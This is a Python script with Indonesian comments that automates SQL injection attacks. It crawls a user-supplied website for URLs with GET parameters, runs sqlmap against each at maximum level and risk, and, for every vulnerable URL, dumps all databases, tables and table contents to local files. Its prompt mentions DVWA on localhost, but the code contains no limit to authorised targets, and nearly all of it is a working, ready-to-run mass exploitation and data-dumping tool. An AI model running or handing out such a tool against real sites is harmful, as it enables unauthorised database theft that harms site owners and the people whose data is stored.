import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import subprocess
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import datetime

# Konfigurasi
CRAWL_LIMIT = 100
MAX_THREADS = 10
SQLMAP_PATH = "sqlmap"  # Pastikan sqlmap ada di PATH

VISITED = set()
URLS_WITH_PARAMS = []
OUTPUT_DIR = "sqlmap_results"

def crawl(url, target_domain):
    """Merayapi URL dan mencari parameter GET"""
    if len(VISITED) >= CRAWL_LIMIT or url in VISITED:
        return
    try:
        response = requests.get(url, timeout=5)
    except:
        return

    VISITED.add(url)
    print(f"[Crawl] {url}")

    soup = BeautifulSoup(response.text, "html.parser")
    for link_tag in soup.find_all("a", href=True):
        link = urljoin(url, link_tag["href"])
        parsed = urlparse(link)

        if target_domain in link and link not in VISITED:
            if parsed.query:
                URLS_WITH_PARAMS.append(link)
            crawl(link, target_domain)

def run_sqlmap_command(cmd, output_file=None):
    """Jalankan perintah sqlmap dan simpan output ke file"""
    print(f"[*] Menjalankan: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    if output_file:
        with open(output_file, "a", encoding="utf-8") as f:
            f.write(result.stdout + "\n" + result.stderr + "\n")
    return result.stdout

def test_sqlmap(url):
    """Uji SQLi, kalau rentan lakukan full dump"""
    print(f"\n[+] Menguji kerentanan SQLi: {url}")
    check_cmd = [
        SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--random-agent"
    ]
    result = subprocess.run(check_cmd, capture_output=True, text=True)

    if re.search(r"the back-end DBMS", result.stdout, re.IGNORECASE):
        print(f"[!!!] Rentan SQLi ditemukan: {url}")
        run_full_dump(url)
    else:
        print(f"[-] Tidak rentan: {url}")

def run_full_dump(url):
    """Dump semua database, tabel, dan isi tabel"""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    target_dir = os.path.join(OUTPUT_DIR, f"dump_{timestamp}")
    os.makedirs(target_dir, exist_ok=True)

    # 1. Dapatkan semua database
    dbs_output = run_sqlmap_command(
        [SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--dbs"],
        os.path.join(target_dir, "dump.txt")
    )
    databases = re.findall(r"\[\*\] (.+)", dbs_output)
    databases = [db.strip() for db in databases if db.strip()]

    for db in databases:
        print(f"[DB] {db}")

        # 2. Dapatkan semua tabel di DB
        tables_output = run_sqlmap_command(
            [SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "-D", db, "--tables"],
            os.path.join(target_dir, "dump.txt")
        )
        tables = re.findall(r"\[\*\] (.+)", tables_output)
        tables = [t.strip() for t in tables if t.strip()]

        for tbl in tables:
            print(f"    [Table] {tbl}")

            # 3. Dump isi tabel
            run_sqlmap_command(
                [SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "-D", db, "-T", tbl, "--dump"],
                os.path.join(target_dir, "dump.txt")
            )

if __name__ == "__main__":
    TARGET = input("Masukkan URL target (contoh: http://localhost/dvwa/): ").strip()
    if not TARGET.startswith("http"):
        print("[!] URL harus diawali http:// atau https://")
        exit()

    TARGET_DOMAIN = urlparse(TARGET).netloc
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    print("[*] Mulai crawling...")
    crawl(TARGET, TARGET_DOMAIN)

    print(f"\n[!] Total URL dengan parameter ditemukan: {len(URLS_WITH_PARAMS)}")

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(test_sqlmap, url) for url in URLS_WITH_PARAMS]
        for future in as_completed(futures):
            future.result()

    print(f"\n[✓] Semua hasil disimpan di folder: {OUTPUT_DIR}")
